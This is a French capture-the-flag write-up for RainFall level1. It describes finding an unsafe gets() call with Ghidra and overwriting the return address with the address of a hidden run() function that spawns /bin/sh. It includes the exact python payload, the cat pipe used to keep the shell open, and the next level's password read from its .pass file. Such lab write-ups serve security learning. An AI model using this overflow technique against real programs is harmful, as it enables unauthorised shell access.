Etape 1 : Un binaire *level1* est présent dans le dossier, par habitude on l'éxécute et celui-ci ouvre une entrée sur la sortie standard. En écrivant n'importe quoi rien ne se produit.

Etape 2 : Après décompilation avec l'outil Ghidra on aperçoit la fonction *gets* cette fonction n'est pas sécurisé et est sujet au buffer overflow.

Un buffer overflow consiste a écrire plus de données dans une variable qu'elle ne peut en contenir, provoquant un comportement indéfini du programme.

Etape 3 : Hormis la fonction gets, le main ne contient rien d'exploitable, en fouillant les fonctions du binaire on trouve une fonction *run()* qui éxécute un */bin/sh*.

L'objectif sera donc de faire en sorte que le binaire récupére via gets une chaine de caractère correspondant a la taille attendu auquel on ajoutera l'adresse de la fonction run qui écrasera le return de la fonction gets et sera ainsi éxécuté a la place.

Ceci est possible car certaines options de sécurité ne sont pas activés, notamment des check pour vérifier les modifications des adresses de return ou encore la randomisation de la mémoire.

Etape 4 : Script pour préparer le buffer avec l'adresse
```bash
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/buffer1
```

Il reste a solutionner un problème, on souhaite garder le shell ouvert a son éxécution car */bin/sh* se ferme directement après éxécution.
Pour ce faire on peut utiliser la commande cat tout en redirigeant la sortie :

Etape 5 : 
```bash
level1@RainFall:~$ cat /tmp/buffer1 - | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

